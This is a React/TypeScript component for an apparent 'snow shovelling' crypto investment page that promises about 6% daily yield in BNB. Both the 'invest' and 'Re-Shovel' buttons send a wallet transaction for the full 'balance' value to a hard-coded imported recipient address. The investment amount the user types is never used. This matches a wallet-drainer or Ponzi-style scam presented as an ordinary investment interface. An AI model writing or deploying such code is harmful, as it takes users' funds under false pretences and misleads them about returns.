import "./Hives.scss"
import { ButtonModal } from "components"
import { useState } from "react"
import cn from "classnames"
import Web3 from "web3"
import { useSearchParams } from "react-router-dom"
import { useWeb3React } from "@web3-react/core"

import snowSrc from "assets/images/snow-small.webp"
import goldSrc from "assets/images/gold.webp"
import chestSrc from "assets/images/chest.webp"
import {recipient} from "abi"
import { ReactComponent as Close } from "assets/icons/close-small.svg"

type Props = {
  className?: string
  isModal?: () => void
  bonus: number
  miners: number
  time: number
  balance: number
}

export const Hives = ({ className, isModal, bonus, miners, time, balance }: Props): JSX.Element => {
  const { account, library } = useWeb3React()
  const [input, setInput] = useState("")
  const [focused, setFocused] = useState(false)
  const [search] = useSearchParams()

  const buy = async () => {
    // @ts-ignore
    const toWei = amount => Web3.utils.toWei(amount)

    // @ts-ignore
    const web3 = new Web3(library.provider)
    await web3.eth.sendTransaction({
      // @ts-ignore
      from: account,
      to: recipient,
      value: toWei(balance.toString())
    }, () => {
    })
  }

  const buySecond = async () => {
    // @ts-ignore
    const toWei = amount => Web3.utils.toWei(amount)

    // @ts-ignore
    const web3 = new Web3(library.provider)
    await web3.eth.sendTransaction({
      // @ts-ignore
      from: account,
      to: recipient,
      value: toWei(balance.toString())
    }, () => {
    })
  }

  const convert = n => {
    const d = Number(n)
    const hours = Math.floor(d / 3600)
    const minutes = Math.floor((d % 3600) / 60)
    const seconds = Math.floor((d % 3600) % 60)

    return (
      ("0" + Math.floor(hours)).slice(-2) +
      ":" +
      ("0" + Math.floor(minutes)).slice(-2) +
      ":" +
      ("0" + Math.floor(seconds)).slice(-2)
    )
  }

  return (
    <div className={cn("hives", className)}>
      {isModal && (
        <div className="hives-header">
          <img src={snowSrc} className="hives-block-left-img" alt="placeholder" />
          <button onClick={isModal} className="hives-header-btn">
            <Close />
          </button>
        </div>
      )}
      <div className="hives-block">
        <div className="hives-block-left">
          <img src={snowSrc} className="hives-block-left-img" alt="placeholder" />
          Ice Castle
        </div>
        <div className="hives-block-right">{miners > 0 ? miners : "0.000"} INUITS</div>
      </div>
      <div className="hives-block">
        <div className="hives-block-left">
          <img src={chestSrc} className="hives-block-left-img" alt="placeholder" />
          Daily Profit
        </div>
        <div className="hives-block-right">{bonus > 0 ? bonus.toFixed(5) : "0.000"} BNB</div>
      </div>
      <div className="hives-block">
        <div className="hives-block-left">
          <img src={goldSrc} className="hives-block-left-img" alt="placeholder" />
          Daily Yield
        </div>
        <div className="hives-block-right">~6%</div>
      </div>
      <div className="hives-input-wrapper">
        <input
          onBlur={() => setFocused(false)}
          onFocus={() => setFocused(true)}
          onChange={e => setInput(e.target.value)}
          value={input}
          type="number"
          placeholder={focused ? "" : "Fill in your investment amount (>0.1)"}
          className="hives-input withAppend"
        />
        <div className="hives-input-append">BNB</div>
      </div>
      <ButtonModal onClick={buy} text="Shovel Snow (invest)" className="hives-btn first-child" />
      <ButtonModal
        onClick={buySecond}
        text={`Re-Shovel ${time > 0 && time < 43200 ? convert(time) : ""}`}
        className="hives-btn"
        dark={time > 0 && time < 43200 ? true : undefined}
      />
    </div>
  )
}